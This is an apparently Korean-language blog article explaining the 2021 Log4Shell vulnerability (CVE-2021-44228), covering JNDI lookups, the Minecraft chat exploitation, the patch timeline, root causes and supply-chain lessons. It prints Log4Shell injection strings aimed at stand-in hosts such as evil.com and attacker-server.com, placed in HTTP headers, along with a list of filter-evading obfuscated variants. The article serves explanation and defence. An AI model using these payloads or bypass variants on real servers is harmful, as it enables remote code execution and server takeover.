@@ -1,0 +1,591 @@
+# Log4Shell (2021) — 역사상 최악의 제로데이
+
+*로깅 라이브러리에 숨어 있던 원격 코드 실행 취약점, 마인크래프트 채팅에서 발견되다*
+
+---
+
+2021년 12월 9일. Apache Log4j 2라는 Java 로깅 라이브러리에서 CVSS 10.0 만점짜리 취약점이 공개됨. 이름은 **Log4Shell (CVE-2021-44228)**.
+
+이 취약점이 얼마나 심각했냐면:
+
+- 공격 난이도: 채팅창에 한 줄 입력하는 수준
+- 영향 범위: 전 세계 Java 서버의 상당수
+- 위험도: CVSS 10.0/10.0 (만점)
+- 공격 결과: 원격 코드 실행(RCE) — 서버를 완전히 장악 가능
+
+<Callout type="error" title="사건 요약">
+Apache Log4j 2의 JNDI Lookup 기능에서 원격 코드 실행(RCE) 취약점 발견. 로그 메시지에 특정 문자열을 포함시키기만 하면 공격자가 원격 서버에서 임의의 코드를 실행할 수 있음. 마인크래프트 채팅에서도 익스플로잇 가능할 정도로 공격이 쉬웠음. CVSS 10.0/10.0 만점.
+</Callout>
+
+---
+
+## Log4j가 뭔데
+
+Apache Log4j는 Java 생태계에서 가장 널리 쓰이는 로깅 라이브러리임. Java로 뭔가를 만들면 거의 무조건 쓰게 되는 그런 존재.
+
+```java
+// Log4j의 기본 사용법 — 이렇게 평범한 라이브러리임
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class MyApp {
+    private static final Logger logger = LogManager.getLogger(MyApp.class);
+
+    public void handleRequest(String userInput) {
+        // 사용자 입력을 로그에 기록 — 평범해 보이지만...
+        logger.info("사용자 입력: " + userInput);
+        // 이 한 줄이 서버를 탈취당하는 원인이 됨
+    }
+}
+```
+
+Log4j를 사용하는 프로젝트 목록은 거의 "Java를 쓰는 모든 것"에 가까움:
+
+```
+Log4j를 사용하는 주요 프로젝트/서비스 (일부)
+
+├── Apache
+│   ├── Struts, Solr, Druid, Flink, Kafka
+│   └── 사실상 대부분의 Apache 프로젝트
+├── 클라우드
+│   ├── AWS (여러 서비스)
+│   ├── Azure
+│   ├── Google Cloud
+│   └── Oracle Cloud
+├── 기업용 소프트웨어
+│   ├── VMware
+│   ├── Cisco
+│   ├── IBM
+│   └── SAP
+├── 게임
+│   ├── Minecraft (Java Edition) — 여기서 처음 실전 악용됨
+│   ├── Steam
+│   └── 수많은 Java 기반 게임 서버
+└── 그 외
+    ├── Twitter
+    ├── LinkedIn
+    ├── iCloud
+    └── 세기 어려울 정도로 많음
+```
+
+---
+
+## JNDI Lookup: 취약점의 핵심
+
+### JNDI가 뭔데
+
+JNDI(Java Naming and Directory Interface)는 Java에서 이름으로 리소스를 찾는 API임. 원래는 이런 용도로 쓰임:
+
+```java
+// JNDI의 정상적인 사용 예시
+// 데이터베이스 연결 풀을 이름으로 찾기
+Context ctx = new InitialContext();
+DataSource ds = (DataSource) ctx.lookup("java:comp/env/jdbc/myDB");
+
+// LDAP 디렉토리에서 사용자 정보 조회
+DirContext ldapCtx = new InitialDirContext(env);
+Attributes attrs = ldapCtx.getAttributes("cn=John,dc=example,dc=com");
+```
+
+문제는, JNDI가 **원격 서버에서 Java 클래스를 로드하고 실행할 수 있다는 것**. LDAP이나 RMI 프로토콜을 통해 외부 서버에서 `.class` 파일을 가져와서 실행하는 게 가능했음.
+
+### Log4j의 Lookup 기능
+
+Log4j 2에는 "Lookup"이라는 기능이 있었음. 로그 메시지 안에 특수한 문법을 넣으면 런타임에 값을 치환해주는 기능.
+
+```java
+// Log4j Lookup 예시 — 원래는 편의 기능
+
+// 환경변수 조회
+logger.info("OS: ${env:OS}");
+// "OS: Linux" 출력
+
+// Java 시스템 속성 조회
+logger.info("Java version: ${sys:java.version}");
+// "Java version: 11.0.12" 출력
+
+// 그리고... JNDI Lookup
+logger.info("${jndi:ldap://example.com/exploit}");
+// JNDI를 통해 example.com에 LDAP 요청을 보내고,
+// 반환된 Java 클래스를 로드하고 실행함
+// 이게 바로 Log4Shell
+```
+
+<Callout type="error" title="공격의 핵심">
+로그에 기록되는 문자열에 `$\{jndi:ldap://공격자서버/악성코드\}`를 넣기만 하면 됨. Log4j가 이 문자열을 파싱하면서 JNDI Lookup을 수행하고, 공격자의 LDAP 서버에서 악성 Java 클래스를 다운로드받아 실행함. 서버가 통째로 털리는 거임.
+</Callout>
+
+### 공격 흐름 상세
+
+```
+공격자                    피해 서버                  공격자 LDAP 서버
+  |                          |                          |
+  | HTTP 요청               |                          |
+  | User-Agent:              |                          |
+  | ${jndi:ldap://evil/x}   |                          |
+  |------------------------->|                          |
+  |                          |                          |
+  |                     Log4j가 User-Agent를            |
+  |                     로그에 기록하려고 함             |
+  |                          |                          |
+  |                     "${jndi:ldap://evil/x}"         |
+  |                     패턴 감지, JNDI Lookup 실행     |
+  |                          |                          |
+  |                          |  LDAP 요청              |
+  |                          |------------------------->|
+  |                          |                          |
+  |                          |  응답: 악성 Java 클래스   |
+  |                          |  위치 정보 반환           |
+  |                          |<-------------------------|
+  |                          |                          |
+  |                     악성 클래스 다운로드 및 실행     |
+  |                     리버스 셸, 랜섬웨어,            |
+  |                       코인 마이너 등 무엇이든       |
+  |                          |                          |
+  |  서버 장악 완료          |                          |
+  |<-------------------------|                          |
+```
+
+```typescript
+// 공격이 얼마나 쉬운지 TypeScript로 설명
+// (실제 공격 코드가 아닌 개념 설명용)
+
+// 공격자가 할 일: HTTP 헤더에 페이로드를 넣기만 하면 됨
+const maliciousHeaders = {
+  // 이 헤더 값이 서버의 Log4j를 통해 로그에 기록되면 끝
+  'User-Agent': '${jndi:ldap://attacker-server.com/exploit}',
+
+  // 또는 다른 헤더에도 넣을 수 있음
+  'X-Forwarded-For': '${jndi:ldap://attacker-server.com/exploit}',
+  'Referer': '${jndi:ldap://attacker-server.com/exploit}',
+
+  // 심지어 Accept-Language에도
+  'Accept-Language': '${jndi:ldap://attacker-server.com/exploit}',
+};
+
+// 공격 포인트: 서버가 로그에 기록하는 모든 것
+// - HTTP 헤더 값
+// - URL 파라미터
+// - POST 바디
+// - 쿠키 값
+// - 사용자 이름 (로그인 실패 로그)
+// - 검색어 (검색 로그)
+// - 채팅 메시지 (채팅 서버)  <-- 마인크래프트
+```
+
+---
+
+## 마인크래프트에서 발견된 아이러니
+
+이 취약점이 대중에게 처음 알려진 경로 중 하나가 마인크래프트였음.
+
+마인크래프트 Java Edition의 채팅 시스템이 Log4j를 사용하고 있었고, 채팅에 입력된 메시지가 서버 로그에 기록됨. 공격자가 채팅에 `$\{jndi:ldap://...\}`를 입력하면 마인크래프트 서버가 공격자의 코드를 실행하는 상황.
+
+```
+마인크래프트 채팅:
+Player1: ㅋㅋ 다이아몬드 찾음
+Player2: ㅊㅋ
+Attacker: ${jndi:ldap://evil-server.com/pwn}
+
+서버 로그:
+[INFO] <Player1> ㅋㅋ 다이아몬드 찾음
+[INFO] <Player2> ㅊㅋ
+[INFO] <Attacker> <-- 여기서 JNDI Lookup 실행, 서버 장악
+
+서버 관리자: ???
+```
+
+<Callout type="warning" title="마인크래프트 서버 관리자들의 비명">
+취약점이 공개되자마자 전 세계 마인크래프트 서버 관리자들이 동시에 서버를 내려야 했음. 10대 중학생이 운영하는 소규모 서버부터 수천 명이 접속하는 대형 서버까지. "채팅에 글자 좀 쳤을 뿐인데 서버가 해킹됐다"는 보고가 쏟아짐. Mojang(마인크래프트 개발사)은 긴급 패치를 배포했지만, 이미 많은 서버가 영향을 받은 후였다.
+</Callout>
+
+---
+
+## 공격 변종과 우회 패턴
+
+### 기본 공격 패턴
+
+```
+${jndi:ldap://attacker.com/exploit}
+```
+
+### 우회 패턴들 — WAF를 피하기 위한 변종
+
+보안 팀들이 `$\{jndi:`를 필터링하기 시작하자, 공격자들은 Log4j의 Lookup 중첩 기능을 이용한 우회 패턴을 만들었음:
+
+```
+기본:
+${jndi:ldap://evil.com/x}
+
+소문자/대문자 혼용:
+${jndi:lDaP://evil.com/x}
+
+Lookup 중첩으로 우회:
+${${lower:j}ndi:ldap://evil.com/x}
+${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.com/x}
+
+URL 인코딩:
+${jndi:ldap://evil.com/%65%78%70%6c%6f%69%74}
+
+프로토콜 변경:
+${jndi:rmi://evil.com/exploit}   (RMI 프로토콜)
+${jndi:dns://evil.com/exploit}   (DNS — 정보 유출용)
+${jndi:iiop://evil.com/exploit}  (CORBA)
+
+중첩 조합:
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/x}
+```
+
+<Callout type="error" title="WAF 우회의 끝없는 레이스">
+초기에 많은 조직이 "jndi"나 "ldap" 문자열을 WAF에서 차단하는 것으로 대응했지만, 중첩 Lookup으로 쉽게 우회됨. Log4j가 문자열을 재귀적으로 해석하기 때문에 필터링이 근본적으로 어려웠음. 결국 라이브러리 업데이트만이 확실한 해결책이었다.
+</Callout>
+
+```typescript
+// 왜 문자열 필터링이 안 되는지 설명
+
+// Log4j의 Lookup 해석 과정 (개념적)
+function resolveLookup(input: string): string {
+  // ${...} 패턴을 재귀적으로 해석
+  const lookupPattern = /\$\{([^}]+)\}/;
+
+  let result = input;
+  let match;
+
+  // 중첩된 ${...}를 내부부터 해석
+  while ((match = lookupPattern.exec(result)) !== null) {
+    const expression = match[1];
+    const resolved = evaluateLookup(expression);
+    result = result.replace(match[0], resolved);
+  }
+
+  return result;
+}
+
+// 공격자의 우회:
+// 입력: "${${lower:j}ndi:ldap://evil.com/x}"
+// 1단계: ${lower:j} -> "j"
+// 결과: "${jndi:ldap://evil.com/x}"
+// 2단계: ${jndi:ldap://evil.com/x} -> JNDI Lookup 실행!
+
+// WAF가 "jndi"를 필터링해도 원본 문자열에는 "jndi"가 없음
+// "${lower:j}ndi" <-- 이건 필터에 안 걸림
+```
+
+---
+
+## 취약점 발견과 패치 타임라인
+
+```
+2021년 타임라인:
+
+11월 24일  Alibaba Cloud 보안팀의 Chen Zhaojun이
+           Apache에 취약점을 비공개 보고
+
+11월 26일  CVE-2021-44228 예약됨
+
+12월 1일   야생에서 최초 익스플로잇 시도 감지
+           (일부 공격자는 이미 알고 있었음)
+
+12월 6일   Log4j 2.15.0-rc1 출시 (첫 번째 패치 시도)
+
+12월 9일   취약점이 공식 공개됨
+           GitHub에 PoC(Proof of Concept) 코드 공개
+           전 세계 보안팀 비상 소집
+
+12월 10일  전 세계적으로 대규모 스캔/공격 시작
+           Log4j 2.15.0 정식 출시
+           하지만 2.15.0에도 일부 우회 가능한 경우 발견
+
+12월 13일  2.15.0의 우회 취약점 발견 (CVE-2021-45046)
+           Log4j 2.16.0 출시
+
+12월 17일  2.16.0에서 DoS 취약점 발견 (CVE-2021-45105)
+
+12월 28일  Log4j 2.17.1 출시 — 최종 수정 버전
+           (네 번째 시도만에 완전 패치)
+```
+
+<Callout type="note" title="패치 4번 만에 완료">
+첫 번째 패치(2.15.0)가 불완전했고, 두 번째(2.16.0)도 DoS 취약점이 있었고, 세 번째(2.17.0)도 특정 조건에서 문제가 있었음. 2.17.1에서야 완전히 수정됨. 로깅 라이브러리 하나의 취약점을 고치는 데 패치가 4번이나 필요했다는 건, 문제의 근본 원인(Lookup 기능의 재귀적 해석)이 얼마나 깊이 박혀 있었는지를 보여줌.
+</Callout>
+
+---
+
+## 취약점의 근본 원인 분석
+
+```typescript
+// Log4Shell의 근본 원인을 정리
+
+interface VulnerabilityAnalysis {
+  rootCauses: Array<{
+    cause: string;
+    severity: 'critical' | 'high' | 'medium';
+    description: string;
+  }>;
+}
+
+const log4shellAnalysis: VulnerabilityAnalysis = {
+  rootCauses: [
+    {
+      cause: '데이터와 코드의 혼합',
+      severity: 'critical',
+      description:
+        '로그 메시지(데이터)가 Lookup 표현식(코드)으로 해석됨. ' +
+        'SQL Injection과 동일한 근본 원인: ' +
+        '신뢰할 수 없는 입력을 코드로 실행.',
+    },
+    {
+      cause: '기본 활성화된 위험한 기능',
+      severity: 'critical',
+      description:
+        'JNDI Lookup이 기본으로 활성화되어 있었음. ' +
+        '대부분의 사용자는 이 기능이 존재하는지조차 몰랐음.',
+    },
+    {
+      cause: '네트워크 접근이 가능한 Lookup',
+      severity: 'high',
+      description:
+        '로깅 라이브러리가 외부 네트워크에 접근할 이유가 있는가? ' +
+        'Lookup이 LDAP/RMI로 외부 서버에 요청을 보낼 수 있었음.',
+    },
+    {
+      cause: '원격 코드 로딩',
+      severity: 'critical',
+      description:
+        'JNDI를 통해 외부 서버에서 Java 클래스를 다운로드하고 실행 가능. ' +
+        '이건 의도된 기능이었지만, 보안 관점에서 치명적.',
+    },
+  ],
+};
+```
+
+### 이건 사실 SQL Injection과 같은 패턴
+
+```typescript
+// SQL Injection과 Log4Shell의 공통점
+
+// SQL Injection
+const username = "admin' OR '1'='1"; // 사용자 입력
+const query = `SELECT * FROM users WHERE name = '${username}'`;
+// SELECT * FROM users WHERE name = 'admin' OR '1'='1'
+// 데이터(사용자 이름)가 코드(SQL)로 해석됨
+
+// Log4Shell
+// userAgent = "${jndi:ldap://evil.com/x}" (사용자 입력)
+// logger.info("User-Agent: " + userAgent);
+// 데이터(User-Agent 문자열)가 코드(JNDI Lookup)로 해석됨
+
+// 둘 다 같은 실수: 신뢰할 수 없는 입력을 코드로 해석
+// 해결책도 같음: 데이터를 데이터로만 취급
+
+// SQL Injection 방지: Parameterized Query
+// const safeQuery = "SELECT * FROM users WHERE name = ?";
+// 입력을 항상 데이터로 취급
+
+// Log4Shell 방지: Lookup 기능 비활성화 또는 입력 이스케이프
+// 로그 메시지를 항상 텍스트로 취급
+```
+
+---
+
+## 보안 업데이트의 현실: 패치가 어려운 이유
+
+취약점이 공개되고 패치가 나와도, 실제로 모든 시스템을 업데이트하는 건 전혀 다른 문제임.
+
+```typescript
+// 패치 적용이 어려운 이유
+
+interface PatchChallenge {
+  challenge: string;
+  description: string;
+  realWorldExample: string;
+}
+
+const patchChallenges: PatchChallenge[] = [
+  {
+    challenge: '어디에 Log4j가 있는지 모름',
+    description:
+      '직접 의존성으로 Log4j를 쓰지 않아도, ' +
+      '간접 의존성 깊숙이 Log4j가 포함되어 있을 수 있음. ' +
+      'Java의 경우 JAR 파일 안에 다른 JAR이 중첩되어 있는 ' +
+      '"fat JAR" 구조가 흔함.',
+    realWorldExample:
+      '회사의 300개 마이크로서비스 중 ' +
+      '어떤 서비스가 Log4j를 쓰는지 파악하는 데만 2일 소요',
+  },
+  {
+    challenge: '레거시 시스템',
+    description:
+      '10년 된 시스템은 Log4j 버전을 올리면 호환성 문제 발생 가능. ' +
+      '테스트 환경이 없는 레거시 시스템도 많음.',
+    realWorldExample:
+      '은행의 핵심 시스템이 Log4j 1.x를 쓰고 있는데, ' +
+      '이걸 2.x로 올리려면 대규모 리팩토링이 필요',
+  },
+  {
+    challenge: '서드파티 소프트웨어',
+    description:
+      '내가 고칠 수 없는 상용 소프트웨어가 Log4j를 포함하고 있을 수 있음. ' +
+      '벤더의 패치를 기다려야 함.',
+    realWorldExample:
+      'VMware vCenter가 Log4j를 포함하여 VMware 패치를 기다리는 동안 취약한 상태 유지',
+  },
+  {
+    challenge: '임베디드 시스템',
+    description:
+      'IoT 기기, 네트워크 장비 등에도 Java와 Log4j가 들어가 있을 수 있음. ' +
+      '펌웨어 업데이트가 필요한데 원격으로 불가능한 경우도.',
+    realWorldExample:
+      '공장의 산업용 장비에 Log4j가 포함된 Java 앱이 돌고 있음. ' +
+      '업데이트하려면 공장 중단 필요.',
+  },
+];
+```
+
+```typescript
+// SBOM(Software Bill of Materials)의 중요성
+// — 내 소프트웨어에 뭐가 들어있는지 알아야 한다
+
+interface SBOM {
+  product: string;
+  version: string;
+  components: Array<{
+    name: string;
+    version: string;
+    type: 'direct' | 'transitive';
+    license: string;
+    knownVulnerabilities: string[];
+  }>;
+}
+
+// Log4Shell 이후 SBOM이 주목받게 됨
+// 미국 정부는 2021년 5월 행정명령으로 SBOM 의무화 방침 발표
+// Log4Shell이 터진 건 그로부터 7개월 후
+
+// 현재 SBOM 관련 도구들:
+// - CycloneDX: OWASP의 SBOM 표준
+// - SPDX: Linux Foundation의 SBOM 표준
+// - Syft/Grype: 컨테이너 이미지의 SBOM 생성/취약점 스캔
+// - npm audit / yarn audit: Node.js 의존성 감사
+```
+
+---
+
+## Supply Chain Attack의 시대
+
+Log4Shell은 "공급망 공격(Supply Chain Attack)"의 위험성을 극적으로 보여준 사건임.
+
+```typescript
+// 공급망 공격의 유형과 사례
+
+type SupplyChainAttackType =
+  | 'compromised-library'     // 라이브러리 자체가 취약
+  | 'dependency-confusion'     // 패키지명 혼동
+  | 'typosquatting'           // 오타를 노린 악성 패키지
+  | 'maintainer-takeover'     // 관리자 계정 탈취
+  | 'build-system-compromise'; // 빌드 시스템 침해
+
+interface SupplyChainIncident {
+  name: string;
+  year: number;
+  type: SupplyChainAttackType;
+  impact: string;
+}
+
+const majorIncidents: SupplyChainIncident[] = [
+  {
+    name: 'Log4Shell',
+    year: 2021,
+    type: 'compromised-library',
+    impact: '전 세계 Java 서버의 상당수가 취약',
+  },
+  {
+    name: 'SolarWinds',
+    year: 2020,
+    type: 'build-system-compromise',
+    impact: '미국 정부기관 포함 18,000개 조직 침해',
+  },
+  {
+    name: 'event-stream',
+    year: 2018,
+    type: 'maintainer-takeover',
+    impact: 'npm 패키지에 암호화폐 지갑 탈취 코드 삽입',
+  },
+  {
+    name: 'ua-parser-js',
+    year: 2021,
+    type: 'maintainer-takeover',
+    impact: '주간 800만 다운로드 패키지에 크립토마이너 삽입',
+  },
+  {
+    name: 'colors/faker',
+    year: 2022,
+    type: 'compromised-library',
+    impact: '관리자가 의도적으로 코드를 파괴',
+  },
+];
+
+// 방어 전략
+interface SupplyChainDefense {
+  // 1. 의존성 최소화
+  minimizeDependencies: boolean;
+
+  // 2. 의존성 고정 (lock 파일, 정확한 버전)
+  lockDependencies: boolean;
+
+  // 3. SBOM 생성 및 관리
+  sbom: boolean;
+
+  // 4. 자동 취약점 스캐닝 (CI/CD)
+  vulnerabilityScanning: boolean;
+
+  // 5. 프라이빗 레지스트리 / 캐시
+  privateRegistry: boolean;
+
+  // 6. 서명 검증
+  signatureVerification: boolean;
+
+  // 7. 런타임 보호 (샌드박싱, 최소 권한)
+  runtimeProtection: boolean;
+}
+```
+
+---
+
+## 교훈 정리
+
+<Callout type="success" title="Log4Shell에서 배우는 교훈">
+
+**1. 로깅도 공격 벡터다**
+- "로그 찍는 건 안전하겠지"라는 가정이 틀렸음
+- 사용자 입력을 로그에 기록할 때도 이스케이프/새니타이징 필요
+
+**2. 기본 활성화된 기능은 공격 표면이다**
+- 사용자의 90%가 모르는 기능이 기본으로 켜져 있으면 위험
+- 보안 관점에서 "Secure by Default" 원칙이 중요
+
+**3. 의존성은 공격 표면이다**
+- 내가 안 짠 코드가 내 서버를 위험에 빠뜨릴 수 있음
+- SBOM을 통해 내 소프트웨어에 뭐가 들어있는지 파악해야 함
+
+**4. 패치 적용은 발견보다 어렵다**
+- 취약점 공개 후 실제 패치 적용까지 수주에서 수개월 소요
+- 자동화된 의존성 업데이트와 취약점 스캐닝이 필수
+
+**5. 데이터와 코드를 혼합하지 마라**
+- SQL Injection, XSS, Log4Shell — 전부 같은 근본 원인
+- 사용자 입력을 코드로 해석하면 안 됨
+
+</Callout>
+
+---
+
+## 마치며
+
+Log4Shell은 보안 역사에서 하나의 분수령이 됨. 이 사건 이후 "Software Supply Chain Security"가 업계의 최우선 과제 중 하나로 떠올랐고, 미국 정부의 SBOM 의무화 정책이 가속됨.
+
+가장 아이러니한 건, Log4j를 관리하는 Apache Software Foundation의 해당 프로젝트 관리자가 대부분 무급 자원봉사자였다는 것. 전 세계 수조 원 가치의 인프라가 의존하는 라이브러리를, 여가 시간에 무료로 관리하는 사람들이 유지하고 있었음. 이건 오픈소스 생태계의 구조적 문제이기도 하다.
+
+xkcd의 유명한 만화가 있음: "현대 디지털 인프라"라는 제목 아래 거대한 블록들이 쌓여 있고, 그 맨 아래에 "네브래스카의 어떤 개발자가 2003년부터 무급으로 관리하는 프로젝트"라는 작은 막대가 전체를 받치고 있는 그림. Log4Shell이 바로 그 현실을 증명한 사건.
+
+다음 편에서는 2024년에 터진 가장 최근의 대형 장애 — CrowdStrike의 보안 업데이트가 전 세계 윈도우 컴퓨터를 블루스크린으로 만든 사건을 다룬다.
